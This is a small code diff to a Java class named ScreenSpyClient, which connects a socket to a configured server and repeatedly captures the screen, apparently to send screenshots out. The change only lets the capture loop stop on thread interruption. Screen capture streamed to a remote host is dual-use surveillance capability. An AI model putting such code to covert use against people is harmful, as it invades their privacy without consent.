@@ -29,7 +29,7 @@ public class ScreenSpyClient {
             socket.connect(new InetSocketAddress(SERVER_IP, SERVER_PORT));
 
             // Sending
-            while (true) {
+            while (!Thread.interrupted()) {
                 outputStream = socket.getOutputStream();
                 BufferedImage image = bot.createScreenCapture(screenRectangle);
 
